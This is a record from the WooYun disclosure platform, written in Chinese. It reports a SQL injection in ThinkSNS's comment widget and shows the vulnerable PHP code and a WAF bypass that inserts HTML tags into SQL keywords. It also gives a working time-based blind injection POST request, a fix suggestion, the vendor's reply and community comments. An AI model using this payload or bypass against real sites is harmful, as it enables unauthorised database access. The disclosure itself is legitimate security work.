{"id": 47152, "wybug_id": "wooyun-2014-081751", "wybug_title": "ThinkSNS第一弹 － SQL注入", "wybug_corp": "ThinkSNS", "wybug_author": "猪头子", "wybug_date": "2014-11-05 10:04", "wybug_open_date": "2015-02-03 10:06", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-03：\t细节向公众公开  简要描述： ThinkSNS漏洞系列第一弹，某处处理不当导致SQL注入 详细说明：  漏洞点出现在Comment Widget里：\\addons\\widget\\CommentWidget\\CommentWidget.class.php:138\n/** * 添加评论的操作 * * @return array 评论添加状态和提示信息 */public function addcomment() {    // 返回结果集默认值    $return = array (        'status' => 0,        'data' => L ( 'PUBLIC_CONCENT_IS_ERROR' )    );    // 获取接收数据    $data = $_POST;    // 安全过滤    foreach ( $data as $key => $val ) {        $data [$key] = t ( $data [$key] );    }    // 评论所属与评论内容    $data ['app'] = $data ['app_name'];    $data ['table'] = $data ['table_name'];    $data ['content'] = h ( $data ['content'] );    // 判断资源是否被删除    $dao = M ( $data ['table'] );    $idField = $dao->getPk ();    $map [$idField] = $data ['row_id'];    $sourceInfo = $dao->where ( $map )->find ();    if (! $sourceInfo) {        $return ['status'] = 0;        $return ['data'] = '内容已被删除，评论失败';        exit ( json_encode ( $return ) );    }    ... ... ... ... ... ...    // 添加评论操作    $data ['comment_id'] = model ( 'Comment' )->addComment ( $data );    if ($data ['comment_id']) {        $return ['status'] = 1;        $return ['data'] = $this->parseComment ( $data );        // 同步到微吧        if ($data ['app'] == 'weiba')            $this->_upateToweiba ( $data );        ... ... ... ... ...}\n$_POST经过$data [$key] = t( $data [$key] )后成为$data。然后添加评论后会根据$data['app']选择同步到哪些应用中去，比如：\n// 同步到微吧if ($data ['app'] == 'weiba')    $this->_upateToweiba ( $data );\n\\addons\\widget\\CommentWidget\\CommentWidget.class.php:252:\n// 同步到微吧function _upateToweiba($data) {    $postDetail = D ( 'weiba_post' )->where ( 'feed_id=' . $data ['row_id'] )->find ();    if (! $postDetail)        return false;    ... ... ... ... ...}\n$data['row_id']进入$postDetail = D ( 'weiba_post' )->where ( 'feed_id=' . $data ['row_id'] )->find ()，两边没有单引号包围。而$data['row_id']是前台可控的变量，来自$_POST['row_id']，so，这里就存在SQL注入了。由于ThinkSNS前台有WAF，因此需要结合t()来绕过：\\core\\OpenSociax\\functions.inc.php:630\n/** * t函数用于过滤标签，输出没有html的干净的文本 * @param string text 文本内容 * @return string 处理后内容 */function t($text){    $text = nl2br($text);    $text = real_strip_tags($text);    $text = addslashes($text);    $text = trim($text);    return $text;}\n经过t()的变量都会过real_strip_tags($text)：\\core\\OpenSociax\\functions.inc.php:2274\nfunction real_strip_tags($str, $allowable_tags=\"\") {    $str = html_entity_decode($str,ENT_QUOTES,'UTF-8');    return strip_tags($str, $allowable_tags);}\n而real_strip_tags($text)里的strip_tags($str, $allowable_tags)会过滤掉tag，所以在SQL关键字中插入tag就能bypass waf，最后成为可以被利用的SQL注入。   漏洞证明：  基于时间的盲注，POST请求都要带上正确的referer。\nPOST /index.php?app=widget&mod=Comment&act=addcomment&uid=1app_name=weiba&table_name=user&content=test&row_id=2 a<a>nd 0=sle<a>ep(2);-- -&app_detail_summary=\n\n\n   修复方案：  在SQL查询参数周围加入单引号   版权声明：转载请注明来源 猪头子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-11-09 15:45 厂商回复： 非常感谢,都是strip_tags引起的漏洞,有重复提交. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-05 10:11 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  难道还有2、3、4、5弹么    \n     2014-11-05 10:24 |    \t\ts0mun5  \t\t\t( 普通白帽子  |\t\t\t        Rank:493 漏洞数:24        | .)\t\t \n  猪头子又来了    \n     2014-11-05 10:38 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  已经屌成了这个鬼样子？    \n     2014-11-05 10:43 |    \t\t皂皂 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | a hacker and painter)\t\t \n  已经屌成了这个鬼样子？    \n     2014-11-05 12:54 |    \t\tYouYaX(乌云厂商)\t\t \n  吊炸天，软件还是不能既开源又商业，开源增加危险，对客户易造成损失    \n     2014-11-05 12:56 |    \t\tEbon_Wolf \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:24        | 您好，我似咣咚朲，需要服务吗？专业酱油工...)\t\t \n  牛逼的猪头~~    \n     2014-11-05 17:36 |    \t\tdarker \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:26        | = =)\t\t \n  Ztz同志看这里…    \n     2014-11-06 12:45 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  @darker Hello~    \n     2014-11-06 15:32 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  @皂皂 谢谢师傅送我QQ秀～    \n     2014-11-09 22:12 |    \t\tpyarm \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:7        | 纯属爱好)\t\t \n  牛逼的猪头~~    \n     2014-11-11 10:22 |    \t\t皂皂 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | a hacker and painter)\t\t \n  @猪头子 (◕ฺω◕ฺ) 提交精华漏洞再送一打    \n     2014-12-11 10:19 |    \t\t肉肉  \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:10        | 肉肉在长亭科技，肉肉在长亭科技，肉肉在长...)\t\t \n  猪头子师傅，瞌睡龙说请你喝ddos    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}